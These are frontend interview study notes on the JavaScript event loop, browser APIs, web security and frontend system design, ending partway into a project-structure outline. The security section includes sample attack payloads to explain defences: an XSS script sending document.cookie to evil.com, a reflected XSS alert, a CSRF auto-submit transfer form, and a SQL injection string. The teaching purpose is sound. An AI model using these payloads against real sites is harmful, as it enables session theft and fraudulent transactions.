# Frontend Interview Notes — Advanced Topics

> Covers: JavaScript Fundamentals · Browser APIs · Security · System Design

---

## Table of Contents

1. [JavaScript Fundamentals](#section-1-javascript-fundamentals)
2. [Browser & Web APIs](#section-2-browser--web-apis)
3. [Security](#section-3-security)
4. [System Design for Frontend](#section-4-system-design-for-frontend)

---

# Section 1: JavaScript Fundamentals

---

## 1. The Event Loop (Detailed)

This is the **most important JS concept for interviews**. Understand it deeply.

### The Big Picture

JavaScript is **single-threaded** — it can only do one thing at a time. But it can handle async operations (timers, fetch, events) without blocking. The **Event Loop** is the mechanism that makes this possible.

### The Key Players

```
┌─────────────────────────────────┐
│         Call Stack              │  ← Where code executes (LIFO)
│  [ main() ]                     │
│  [ console.log() ]              │
└─────────────────────────────────┘
         ↓ when stack is empty
┌─────────────────────────────────┐
│       Microtask Queue           │  ← Promises, queueMicrotask (HIGH PRIORITY)
│  [ .then() ][ async/await ]     │
└─────────────────────────────────┘
         ↓ when microtask queue is empty
┌─────────────────────────────────┐
│       Macrotask Queue           │  ← setTimeout, setInterval, I/O (LOWER PRIORITY)
│  [ setTimeout() ][ setInterval ]│
└─────────────────────────────────┘
         ↑
    Event Loop watches: "Is the Call Stack empty?
                         Then pick next task."
```

### How it Works — Step by Step

1. JS runs synchronous code line by line, pushing functions onto the **Call Stack**
2. When an async operation completes (timer fires, fetch resolves), its callback goes into a **queue**
3. The **Event Loop** constantly checks: *"Is the Call Stack empty?"*
4. If yes → it picks the next task from the queue and pushes it onto the Call Stack
5. **Microtasks** (Promises) are always processed **before** Macrotasks (setTimeout)

---

### Easy Example 1 — Basic Order

```js
console.log('1 - Start');             // synchronous

setTimeout(() => {
  console.log('2 - setTimeout');      // macrotask queue
}, 0);

Promise.resolve().then(() => {
  console.log('3 - Promise');         // microtask queue
});

console.log('4 - End');               // synchronous

// OUTPUT:
// 1 - Start
// 4 - End
// 3 - Promise      ← microtask runs BEFORE setTimeout
// 2 - setTimeout   ← macrotask runs last
```

**Why?**
- Lines 1 and 4 are synchronous → run immediately on Call Stack
- `setTimeout` callback → goes to Macrotask Queue
- `Promise.then` callback → goes to Microtask Queue
- Call Stack is now empty → Event Loop checks Microtask Queue first → runs Promise
- Then checks Macrotask Queue → runs setTimeout

---

### Easy Example 2 — Visualizing the Queues

```js
console.log('A');

setTimeout(() => console.log('B'), 0);
setTimeout(() => console.log('C'), 0);

Promise.resolve().then(() => console.log('D'));
Promise.resolve().then(() => console.log('E'));

console.log('F');

// OUTPUT: A → F → D → E → B → C
```

**Walkthrough:**
```
Call Stack runs:  A, F  (synchronous)
Microtask Queue:  [D, E]
Macrotask Queue:  [B, C]

Event Loop: Stack empty → drain microtasks → D, E
Event Loop: Stack empty → pick next macrotask → B
Event Loop: Stack empty → pick next macrotask → C
```

---

### Easy Example 3 — async/await is just Promises

```js
async function main() {
  console.log('1');

  await Promise.resolve();       // pauses here, schedules rest as microtask

  console.log('2');              // runs after microtask queue pick-up
}

main();
console.log('3');

// OUTPUT: 1 → 3 → 2
```

**Why?** `await` suspends the async function and puts the rest of it into the **microtask queue**. Meanwhile, synchronous code (`console.log('3')`) continues.

---

### Easy Example 4 — Nested Microtasks

```js
Promise.resolve()
  .then(() => {
    console.log('A');
    return Promise.resolve();   // adds another microtask
  })
  .then(() => console.log('B'));

Promise.resolve().then(() => console.log('C'));

// OUTPUT: A → C → B
```

**Why?** After `A` runs, `B` is scheduled as a *new* microtask at the end of the queue. `C` was already in the queue before `B`, so `C` runs first.

---

### Summary Table

| Task Type | Examples | Priority | Queue |
|---|---|---|---|
| Synchronous | Regular code, function calls | Immediate | Call Stack |
| Microtask | `Promise.then`, `async/await`, `queueMicrotask` | High | Microtask Queue |
| Macrotask | `setTimeout`, `setInterval`, `fetch` callbacks, DOM events | Normal | Macrotask Queue |

> **Interview answer:** "The event loop continuously checks if the call stack is empty. When it is, it first drains all microtasks (Promises), then picks one macrotask (setTimeout), then drains microtasks again, and so on."

---

## 2. Closures

A closure is when a function **remembers the variables from its outer scope** even after the outer function has finished executing.

```js
function makeCounter() {
  let count = 0;          // this variable is "closed over"

  return function() {
    count++;
    return count;
  };
}

const counter = makeCounter(); // makeCounter() is done, but count lives on
console.log(counter()); // 1
console.log(counter()); // 2
console.log(counter()); // 3
```

**Practical uses:**
- Data privacy / encapsulation
- Factory functions
- Memoization
- Event handlers that remember context

```js
// Classic interview bug — var in loops
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // prints 3, 3, 3 ❌
}

// Fix with let (block scope)
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // prints 0, 1, 2 ✅
}

// Fix with closure (IIFE)
for (var i = 0; i < 3; i++) {
  ((j) => setTimeout(() => console.log(j), 100))(i); // 0, 1, 2 ✅
}
```

---

## 3. Scope & Hoisting

### Scope Types

```js
// Global scope
var globalVar = 'I am global';

function outer() {
  // Function scope
  var funcVar = 'I am in outer';

  if (true) {
    // Block scope (let/const only)
    let blockVar = 'I am in block';
    const blockConst = 'also block';
    var notBlock = 'I leak to function scope!'; // var ignores blocks
  }

  console.log(notBlock);   // ✅ accessible — var leaks
  // console.log(blockVar); // ❌ ReferenceError
}
```

### Hoisting

Variables and function declarations are **moved to the top of their scope** at compile time.

```js
// What you write:
console.log(x);  // undefined (not ReferenceError)
var x = 5;
sayHi();         // works!
function sayHi() { console.log('Hi'); }

// What JS actually executes:
var x;           // declaration hoisted, initialized to undefined
function sayHi() { console.log('Hi'); }  // fully hoisted
console.log(x);  // undefined
x = 5;
sayHi();

// let/const are hoisted but NOT initialized (Temporal Dead Zone)
console.log(y);  // ❌ ReferenceError: Cannot access 'y' before initialization
let y = 10;
```

---

## 4. var vs let vs const

| | `var` | `let` | `const` |
|---|---|---|---|
| Scope | Function | Block | Block |
| Hoisted | Yes (undefined) | Yes (TDZ) | Yes (TDZ) |
| Re-declare | Yes | No | No |
| Re-assign | Yes | Yes | No |
| Global property | Yes (`window.x`) | No | No |

```js
const obj = { name: 'John' };
obj.name = 'Jane';    // ✅ Mutating properties is fine
obj = {};             // ❌ Re-assigning the reference is not

const arr = [1, 2, 3];
arr.push(4);          // ✅ Fine
arr = [5];            // ❌ Not fine
```

---

## 5. `this` Keyword

`this` refers to the **execution context** — it depends on *how* a function is called.

```js
// 1. Global context
console.log(this); // window (browser) or global (Node)

// 2. Object method — this = the object
const user = {
  name: 'Alice',
  greet() { console.log(this.name); } // 'Alice'
};
user.greet();

// 3. Regular function — this = undefined (strict) or global
function show() { console.log(this); }
show(); // window or undefined in strict mode

// 4. Arrow function — this = inherited from enclosing scope
const obj = {
  name: 'Bob',
  greet: () => console.log(this.name), // 'this' is outer scope, NOT obj
  greetCorrect() {
    const inner = () => console.log(this.name); // ✅ inherits obj's this
    inner();
  }
};

// 5. Constructor — this = new object being created
function Person(name) {
  this.name = name;
}
const p = new Person('Charlie'); // this = {}

// 6. Explicit binding
function greet() { console.log(this.name); }
greet.call({ name: 'Dave' });         // Dave
greet.apply({ name: 'Eve' });         // Eve
const bound = greet.bind({ name: 'Frank' });
bound();                               // Frank
```

---

## 6. Prototypal Inheritance

Every object in JS has a `[[Prototype]]` (hidden link to another object). When you access a property, JS walks up the **prototype chain** until it finds it or hits `null`.

```js
const animal = {
  eat() { console.log('eating'); }
};

const dog = Object.create(animal); // dog's prototype = animal
dog.bark = function() { console.log('woof'); };

dog.bark(); // 'woof'     — own property
dog.eat();  // 'eating'   — found on prototype chain

// Class syntax (syntactic sugar over prototypes)
class Animal {
  constructor(name) { this.name = name; }
  eat() { console.log(`${this.name} is eating`); }
}

class Dog extends Animal {
  bark() { console.log('woof'); }
}

const d = new Dog('Rex');
d.eat();  // works via prototype chain
d.bark(); // own method
```

---

## 7. Promises & Async/Await

### Promises

```js
const fetchUser = (id) => new Promise((resolve, reject) => {
  setTimeout(() => {
    if (id > 0) resolve({ id, name: 'Alice' });
    else reject(new Error('Invalid ID'));
  }, 1000);
});

// Chaining
fetchUser(1)
  .then(user => user.name)
  .then(name => console.log(name))
  .catch(err => console.error(err))
  .finally(() => console.log('Done'));
```

### Promise Methods

```js
// Promise.all — all must resolve, fails fast
const [user, posts] = await Promise.all([fetchUser(1), fetchPosts(1)]);

// Promise.allSettled — wait for all, even if some fail
const results = await Promise.allSettled([p1, p2, p3]);
// results = [{ status: 'fulfilled', value: ... }, { status: 'rejected', reason: ... }]

// Promise.race — first to resolve/reject wins
const first = await Promise.race([fast, slow]);

// Promise.any — first to RESOLVE wins (ignores rejections)
const fastest = await Promise.any([p1, p2, p3]);
```

### Async/Await

```js
async function loadData() {
  try {
    const response = await fetch('/api/data');
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Failed:', error);
    throw error; // re-throw if needed
  }
}

// Parallel fetches — don't await sequentially
// ❌ Sequential (slow — 2 seconds total)
const user = await fetchUser();
const posts = await fetchPosts();

// ✅ Parallel (fast — 1 second total)
const [user, posts] = await Promise.all([fetchUser(), fetchPosts()]);
```

---

## 8. Array Methods

```js
const numbers = [1, 2, 3, 4, 5];
const users = [
  { id: 1, name: 'Alice', age: 25, active: true },
  { id: 2, name: 'Bob',   age: 17, active: false },
  { id: 3, name: 'Carol', age: 30, active: true },
];

// map — transform each element, returns new array
const doubled = numbers.map(n => n * 2);          // [2,4,6,8,10]
const names = users.map(u => u.name);             // ['Alice','Bob','Carol']

// filter — keep elements that pass the test
const adults = users.filter(u => u.age >= 18);   // Alice, Carol
const evens = numbers.filter(n => n % 2 === 0);  // [2, 4]

// reduce — accumulate into a single value
const sum = numbers.reduce((acc, n) => acc + n, 0); // 15
const nameMap = users.reduce((acc, u) => {
  acc[u.id] = u.name;
  return acc;
}, {}); // { 1: 'Alice', 2: 'Bob', 3: 'Carol' }

// find — first match (returns element or undefined)
const bob = users.find(u => u.name === 'Bob');

// findIndex — first match index
const idx = users.findIndex(u => u.id === 2); // 1

// some — at least one passes
const hasMinors = users.some(u => u.age < 18); // true

// every — all pass
const allActive = users.every(u => u.active); // false

// flat / flatMap
const nested = [[1, 2], [3, 4]];
nested.flat();                          // [1,2,3,4]
nested.flatMap(arr => arr.map(n => n * 2)); // [2,4,6,8]

// sort (mutates!) — always provide comparator for numbers
const sorted = [...numbers].sort((a, b) => b - a); // [5,4,3,2,1]
const byAge = [...users].sort((a, b) => a.age - b.age);
```

---

## 9. Destructuring & Spread/Rest

```js
// Array destructuring
const [first, second, ...rest] = [1, 2, 3, 4, 5];
// first=1, second=2, rest=[3,4,5]

// Object destructuring
const { name, age, city = 'Unknown' } = user; // city has default
const { name: userName } = user;              // rename to userName

// Nested destructuring
const { address: { street } } = { address: { street: '123 Main St' } };

// Spread
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5];         // [1,2,3,4,5]
const obj1 = { a: 1 };
const obj2 = { ...obj1, b: 2 };       // { a:1, b:2 }

// Rest in functions
function sum(...numbers) {            // rest — collects all args
  return numbers.reduce((a, b) => a + b, 0);
}
sum(1, 2, 3, 4); // 10
```

---

## 10. Shallow vs Deep Copy

```js
const original = { name: 'Alice', address: { city: 'NYC' } };

// Shallow copy — nested objects are still shared references
const shallow = { ...original };
const shallow2 = Object.assign({}, original);

shallow.address.city = 'LA';
console.log(original.address.city); // 'LA' — MUTATED! ❌

// Deep copy options
// 1. JSON (simple, but loses functions, Date, undefined, circular refs)
const deep1 = JSON.parse(JSON.stringify(original));

// 2. structuredClone (modern, recommended)
const deep2 = structuredClone(original);

deep2.address.city = 'Chicago';
console.log(original.address.city); // 'NYC' — safe ✅
```

---

## 11. Optional Chaining & Nullish Coalescing

```js
const user = { profile: { name: 'Alice' } };

// Optional chaining (?.) — short-circuits to undefined instead of throwing
const city = user?.address?.city;          // undefined (no error)
const len = user?.friends?.length;         // undefined
const first = user?.friends?.[0];          // undefined
const result = user?.getAge?.();           // undefined (safe method call)

// Nullish coalescing (??) — fallback for null/undefined only
const name = user?.name ?? 'Anonymous';    // 'Alice'
const count = 0 ?? 'default';              // 0 (not 'default'! 0 is not null/undefined)
const count2 = 0 || 'default';             // 'default' (|| treats 0 as falsy)
```

---

## 12. WeakMap, WeakSet, WeakRef

These hold **weak references** — they don't prevent garbage collection.

```js
// WeakMap — keys must be objects, not enumerable
const cache = new WeakMap();

function processUser(user) {
  if (cache.has(user)) return cache.get(user);
  const result = expensiveComputation(user);
  cache.set(user, result);
  return result;
}
// When `user` object is garbage collected, cache entry is automatically removed

// WeakSet — stores objects, auto-removes when object is GC'd
const seen = new WeakSet();
function processOnce(obj) {
  if (seen.has(obj)) return;
  seen.add(obj);
  process(obj);
}
```

**Use case:** Caching data associated with objects without preventing GC. Useful for DOM nodes.

---

## 13. Generators & Iterators

```js
// Generator — a function that can pause and resume
function* counter(start = 0) {
  while (true) {
    yield start++;   // pause here, return value
  }
}

const gen = counter(1);
console.log(gen.next().value); // 1
console.log(gen.next().value); // 2
console.log(gen.next().value); // 3

// Finite generator
function* range(start, end) {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}

for (const num of range(1, 5)) {
  console.log(num); // 1, 2, 3, 4, 5
}

// Practical: lazy data pagination
function* paginate(data, pageSize) {
  for (let i = 0; i < data.length; i += pageSize) {
    yield data.slice(i, i + pageSize);
  }
}
```

---

## 14. ES Modules vs CommonJS

| | ES Modules | CommonJS |
|---|---|---|
| Syntax | `import/export` | `require/module.exports` |
| Loading | Static (compile time) | Dynamic (runtime) |
| Tree-shaking | ✅ Yes | ❌ No |
| Browser native | ✅ Yes | ❌ No (needs bundler) |
| Default in | Modern JS, React, Vite | Node.js (legacy) |

```js
// ES Modules
export const PI = 3.14;
export default function main() {}
import { PI } from './math.js';
import main from './main.js';
import * as utils from './utils.js';

// CommonJS (Node.js)
module.exports = { PI: 3.14 };
const { PI } = require('./math.js');
```

---

## 15. Currying & Function Composition

```js
// Currying — transforms f(a, b, c) into f(a)(b)(c)
const add = (a) => (b) => a + b;
const add5 = add(5);
add5(3); // 8
add5(10); // 15

// Practical currying
const multiply = a => b => a * b;
const double = multiply(2);
const triple = multiply(3);
[1,2,3].map(double); // [2,4,6]

// Function composition
const compose = (...fns) => x => fns.reduceRight((acc, fn) => fn(acc), x);
const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);

const process = pipe(
  x => x * 2,
  x => x + 1,
  x => `Result: ${x}`
);
process(5); // "Result: 11"
```

---

## 16. Memoization

```js
function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const slowFib = n => n <= 1 ? n : slowFib(n-1) + slowFib(n-2);
const fastFib = memoize(slowFib);
fastFib(40); // instant after first call
```

---

# Section 2: Browser & Web APIs

---

## 1. How Browsers Render Pages (Critical Rendering Path)

```
HTML → DOM
CSS  → CSSOM
         ↓
    DOM + CSSOM → Render Tree
                      ↓
                   Layout (calculate positions/sizes)
                      ↓
                   Paint (fill pixels)
                      ↓
                   Composite (layer merging, GPU)
```

**Key concepts:**
- **Render-blocking resources:** CSS blocks rendering. JS blocks HTML parsing (use `defer`/`async`)
- **Reflow (Layout):** Expensive — triggered by changing size, position, or content of elements
- **Repaint:** Less expensive — triggered by changing color, visibility (without layout change)
- **Composite:** Cheapest — CSS transforms, opacity (GPU-accelerated)

```html
<!-- async — downloads in parallel, executes immediately when ready -->
<script async src="analytics.js"></script>

<!-- defer — downloads in parallel, executes AFTER HTML parsing -->
<script defer src="app.js"></script>
```

**Performance tip:** Prefer CSS `transform` and `opacity` for animations — they skip Layout and Paint.

---

## 2. DOM Manipulation

```js
// Selecting elements
const el = document.getElementById('my-id');
const el2 = document.querySelector('.my-class');    // first match
const els = document.querySelectorAll('div.card');  // all matches (NodeList)

// Creating & modifying
const div = document.createElement('div');
div.textContent = 'Hello';                          // safe (no XSS)
div.innerHTML = '<strong>Hello</strong>';           // ⚠️ XSS risk with user data
div.classList.add('active');
div.classList.toggle('hidden');
div.setAttribute('data-id', '123');

// Inserting
document.body.appendChild(div);
parent.insertBefore(div, referenceNode);
parent.insertAdjacentHTML('beforeend', '<p>New</p>'); // fastest for HTML strings

// Removing
el.remove();
parent.removeChild(el);
```

---

## 3. Event Delegation

Instead of attaching listeners to every child, attach **one listener to the parent**. Uses event bubbling.

```js
// ❌ Inefficient — 1000 listeners
document.querySelectorAll('.item').forEach(item => {
  item.addEventListener('click', handleClick);
});

// ✅ Efficient — 1 listener
document.querySelector('#list').addEventListener('click', (e) => {
  if (e.target.matches('.item')) {
    handleClick(e.target);
  }
  if (e.target.closest('.delete-btn')) {
    deleteItem(e.target.closest('.item'));
  }
});
```

**Benefits:** Works for dynamically added elements. Better memory usage.

---

## 4. Event Bubbling & Capturing

```
                    Document
                       |
        Capturing ↓    |    ↑ Bubbling
                    Parent
                       |
                     Child  ← click happens here
```

```js
// Bubbling (default) — event travels UP from target to root
child.addEventListener('click', handler);          // 3rd arg default = false = bubble

// Capturing — event travels DOWN from root to target
parent.addEventListener('click', handler, true);   // capture phase

// Stop propagation
element.addEventListener('click', (e) => {
  e.stopPropagation();   // stop bubbling/capturing
  e.preventDefault();    // prevent default browser action (form submit, link)
});
```

---

## 5. Storage APIs

| | localStorage | sessionStorage | Cookies | IndexedDB |
|---|---|---|---|---|
| Capacity | ~5MB | ~5MB | ~4KB | Hundreds of MB |
| Expires | Never | Tab close | Set expiry | Never |
| Sent with requests | No | No | Yes | No |
| Accessible from JS | Yes | Yes | Yes | Yes |
| Use case | User prefs, theme | Tab-specific state | Auth tokens (httpOnly) | Large structured data |

```js
// localStorage — persists forever
localStorage.setItem('theme', 'dark');
const theme = localStorage.getItem('theme');
localStorage.removeItem('theme');
localStorage.clear();

// Always parse JSON
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user'));

// sessionStorage — same API, clears on tab close
sessionStorage.setItem('draft', text);

// Cookies
document.cookie = 'name=Alice; path=/; max-age=3600; Secure; SameSite=Strict';
```

---

## 6. fetch API

```js
// GET
const res = await fetch('/api/users');
if (!res.ok) throw new Error(`HTTP error: ${res.status}`);
const users = await res.json();

// POST
const res = await fetch('/api/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Alice' }),
});

// With timeout using AbortController
const controller = new AbortController();
const timeout = setTimeout(() => controller.abort(), 5000);

try {
  const res = await fetch('/api/data', { signal: controller.signal });
  const data = await res.json();
} catch (err) {
  if (err.name === 'AbortError') console.log('Request timed out');
} finally {
  clearTimeout(timeout);
}
```

---

## 7. CORS — Cross-Origin Resource Sharing

**Problem:** Browser blocks requests to a different origin (domain/port/protocol) by default.

**Origin = Protocol + Domain + Port**
`https://myapp.com:443` ≠ `http://myapp.com` (different protocol)
`https://myapp.com` ≠ `https://api.myapp.com` (different subdomain)

```
Browser → fetch('https://api.other.com/data')
Browser adds header:  Origin: https://myapp.com

Server must respond:  Access-Control-Allow-Origin: https://myapp.com
                   or Access-Control-Allow-Origin: *

If header missing → Browser BLOCKS the response (request was sent, response blocked)
```

**Fix on server (Node/Express):**
```js
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
```

**Preflight requests:** For non-simple requests (PUT, DELETE, custom headers), browser sends an `OPTIONS` request first to check if the server allows it.

---

## 8. Service Workers & PWA

A **Service Worker** is a script that runs in the background (separate thread), intercepting network requests. Powers offline functionality, push notifications, and background sync.

```js
// Register service worker
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

// sw.js — Cache on install
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open('v1').then(cache =>
      cache.addAll(['/index.html', '/styles.css', '/app.js'])
    )
  );
});

// Intercept fetch — serve from cache, fallback to network
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request).then(cached =>
      cached || fetch(event.request)
    )
  );
});
```

---

## 9. Web Workers

Run CPU-heavy JavaScript on a **background thread** to avoid blocking the UI thread.

```js
// main.js
const worker = new Worker('worker.js');

worker.postMessage({ data: largeArray });      // send data to worker

worker.onmessage = (e) => {
  console.log('Result:', e.data);              // receive result
};

// worker.js (separate file, no DOM access)
self.onmessage = (e) => {
  const result = heavyComputation(e.data.data);
  self.postMessage(result);                    // send back result
};
```

**Use case:** Image processing, sorting huge arrays, cryptography — anything that would freeze the UI.

---

## 10. WebSockets vs SSE vs Long Polling

| | WebSocket | Server-Sent Events (SSE) | Long Polling |
|---|---|---|---|
| Direction | Bi-directional | Server → Client only | Server → Client |
| Protocol | `ws://` / `wss://` | HTTP | HTTP |
| Complexity | Medium | Low | Low |
| Use case | Chat, games, live collab | Notifications, live feed | Simple real-time |
| Auto-reconnect | Manual | Built-in | Manual |

```js
// WebSocket
const ws = new WebSocket('wss://api.example.com/ws');
ws.onopen = () => ws.send(JSON.stringify({ type: 'join', room: 'general' }));
ws.onmessage = (e) => console.log(JSON.parse(e.data));
ws.onclose = () => console.log('Disconnected');

// Server-Sent Events
const sse = new EventSource('/api/events');
sse.onmessage = (e) => console.log(e.data);
sse.addEventListener('notification', (e) => handleNotification(e.data));
```

---

## 11. Intersection Observer

Detect when elements enter/leave the viewport — use for lazy loading, infinite scroll, animations.

```js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.classList.add('visible');
      // For lazy loading images:
      const img = entry.target;
      img.src = img.dataset.src;    // load image only when visible
      observer.unobserve(img);      // stop watching after load
    }
  });
}, {
  threshold: 0.1,      // trigger when 10% visible
  rootMargin: '50px',  // trigger 50px before entering viewport
});

document.querySelectorAll('.lazy-img').forEach(img => observer.observe(img));
```

---

## 12. MutationObserver

Watch for changes to the DOM tree.

```js
const observer = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      console.log('Children changed:', mutation.addedNodes);
    }
    if (mutation.type === 'attributes') {
      console.log('Attribute changed:', mutation.attributeName);
    }
  });
});

observer.observe(document.body, {
  childList: true,    // watch for add/remove
  subtree: true,      // watch all descendants
  attributes: true,   // watch attribute changes
});

observer.disconnect(); // stop watching
```

---

## 13. requestAnimationFrame

Schedule animations to run at the **browser's refresh rate** (usually 60fps). Smoother than `setTimeout`.

```js
function animate(timestamp) {
  // Move element
  element.style.transform = `translateX(${timestamp * 0.1}px)`;

  requestAnimationFrame(animate); // schedule next frame
}

requestAnimationFrame(animate);
```

---

## 14. HTTP/1.1 vs HTTP/2 vs HTTP/3

| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---|---|---|---|
| Multiplexing | ❌ (one request per connection) | ✅ | ✅ |
| Header compression | ❌ | ✅ (HPACK) | ✅ (QPACK) |
| Server push | ❌ | ✅ | ✅ |
| Protocol | TCP | TCP | QUIC (UDP-based) |
| TLS required | Optional | Effectively yes | Yes |
| Head-of-line blocking | Yes | TCP level | ❌ Fixed |

---

## 15. REST vs GraphQL

| | REST | GraphQL |
|---|---|---|
| Endpoints | Multiple (`/users`, `/posts`) | Single (`/graphql`) |
| Over/under-fetching | Common | No — request exactly what you need |
| Versioning | URL versioning (`/v2/`) | Schema evolution |
| Caching | Easy (HTTP cache) | Requires extra setup |
| Learning curve | Low | Higher |

```graphql
# GraphQL — get exactly what you need
query {
  user(id: "1") {
    name
    email
    posts { title }
  }
}
```

---

# Section 3: Security

---

## 1. XSS — Cross-Site Scripting

**Attack:** Injecting malicious scripts into web pages viewed by other users.

### Types

**Stored XSS** — malicious script saved to database, served to all users.
```
User submits: <script>fetch('https://evil.com?c='+document.cookie)</script>
This gets stored in the DB and rendered for every visitor → steals cookies
```

**Reflected XSS** — script in URL, reflected back in response.
```
https://site.com/search?q=<script>alert(1)</script>
```

**DOM-based XSS** — script injected via JavaScript that manipulates the DOM.

### Prevention

```js
// 1. Never use innerHTML with user data
element.innerHTML = userInput;        // ❌ dangerous
element.textContent = userInput;      // ✅ safe — treats as text, not HTML

// 2. Escape HTML entities
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// 3. Content Security Policy header (see below)
// 4. Use DOMPurify library when you MUST render HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput); // ✅

// 5. React is safe by default — JSX auto-escapes
<p>{userInput}</p>     // ✅ React escapes this
<p dangerouslySetInnerHTML={{ __html: userInput }} />  // ❌ Use DOMPurify here
```

---

## 2. CSRF — Cross-Site Request Forgery

**Attack:** Tricks an authenticated user into unknowingly making a request to your server.

```
User is logged into bank.com (has session cookie)
User visits evil.com which has:
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000" />
  <input name="to" value="attacker" />
</form>
<script>document.forms[0].submit()</script>

Browser sends request WITH the bank.com cookie → transfer happens!
```

### Prevention

```js
// 1. CSRF Token — server sends unique token, client must include it
// Server:
const csrfToken = generateToken();
res.cookie('csrf-token', csrfToken);

// Client:
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': getCsrfToken() },
});

// Server validates: token in header must match token in session

// 2. SameSite cookie attribute (modern, best defense)
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
// SameSite=Strict — cookie NOT sent on cross-site requests
// SameSite=Lax    — cookie sent only on top-level GET (safe default)

// 3. Check Origin/Referer header
// 4. Use POST/PUT/DELETE (not GET) for state-changing actions
```

---

## 3. Content Security Policy (CSP)

CSP is an HTTP header that tells the browser **which sources are allowed to load resources**. Strongest defense against XSS.

```
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline';
```

```js
// Express example
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://trusted-cdn.com; " +
    "img-src 'self' data: https:; " +
    "style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

| Directive | Controls |
|---|---|
| `default-src` | Fallback for all resource types |
| `script-src` | JavaScript sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | fetch, XHR, WebSocket |
| `'self'` | Same origin only |
| `'none'` | Block everything |

---

## 4. HTTPS & TLS

**HTTP** sends data in plain text — anyone on the network can read it.
**HTTPS** = HTTP + TLS encryption — data is encrypted end-to-end.

**TLS Handshake (simplified):**
1. Client says "I want to connect securely" + supported cipher suites
2. Server sends its **certificate** (contains public key, signed by Certificate Authority)
3. Client verifies the certificate (trusts CA)
4. They exchange keys and establish an **encrypted session**
5. All data encrypted with symmetric key

**Security headers to always include:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains  (HSTS)
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 5. HttpOnly & Secure Cookies

```
Set-Cookie: token=abc123;
  HttpOnly;     ← Cannot be accessed by JavaScript (document.cookie)
  Secure;       ← Only sent over HTTPS
  SameSite=Strict; ← Only sent on same-site requests
  Path=/;
  Max-Age=3600
```

**Why HttpOnly matters:** If an XSS attack succeeds, the attacker's script **cannot read HttpOnly cookies** — so they can't steal the session token.

---

## 6. JWT (JSON Web Tokens)

**Structure:** `header.payload.signature` (Base64 encoded)

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsImV4cCI6MTcwMDAwMH0.AbCdEf...
    Header                   Payload                         Signature
```

```js
// Payload — readable (NOT encrypted, just encoded)
{ userId: 1, role: 'admin', exp: 1700000000 }

// Never store sensitive data in JWT payload!
// Anyone can decode it: atob(token.split('.')[1])

// Storage debate:
// localStorage  — accessible by JS, XSS risk
// httpOnly cookie — safer, but needs CSRF protection
// Recommendation: httpOnly + Secure + SameSite=Strict cookie
```

---

## 7. SQL Injection (Awareness for API Routes)

```js
// ❌ Vulnerable — user input directly in query
const query = `SELECT * FROM users WHERE email = '${userEmail}'`;
// If email = "' OR '1'='1" → dumps all users

// ✅ Safe — parameterized queries
const query = 'SELECT * FROM users WHERE email = $1';
db.query(query, [userEmail]);
```

Even as a frontend dev, when writing Next.js API routes or serverless functions, always use parameterized queries or an ORM.

---

## 8. Dependency Security

```bash
# Check for known vulnerabilities
npm audit
npm audit fix

# Lock dependencies to exact versions in production
npm ci  # uses package-lock.json exactly

# Keep dependencies updated
npm outdated
```

---

## 9. Input Validation

```js
// Frontend validation (UX, not security)
if (!email.includes('@')) showError('Invalid email');

// Backend validation (always required — frontend can be bypassed)
import Joi from 'joi';
const schema = Joi.object({
  email: Joi.string().email().required(),
  age: Joi.number().min(0).max(120).required(),
  name: Joi.string().max(100).pattern(/^[a-zA-Z\s]+$/).required(),
});

const { error } = schema.validate(req.body);
if (error) return res.status(400).json({ error: error.details[0].message });
```

---

# Section 4: System Design for Frontend

---

## 1. How to Approach a Frontend System Design Question

**Framework (use this structure in interviews):**

```
1. Clarify requirements (2 min)
   - Who uses it? Scale? Mobile/desktop?
   - Core features vs nice-to-have?

2. High-level component architecture (5 min)
   - Page/route structure
   - Core components and their relationships
   - Data flow direction

3. Data management (5 min)
   - What state is local vs global?
   - API design? REST or GraphQL?
   - Caching strategy?

4. Performance (3 min)
   - Code splitting? Lazy loading?
   - Image optimization?
   - SSR vs CSR vs SSG?

5. Scalability & maintainability (3 min)
   - Folder structure
   - Design system / component library?
   - Testing strategy?

6. Security & accessibility (2 min)
```

---

## 2. Design a Large-Scale React App Structure

```
src/
├── app/                    # App-level setup
│   ├── store.ts            # Redux/Zustand store
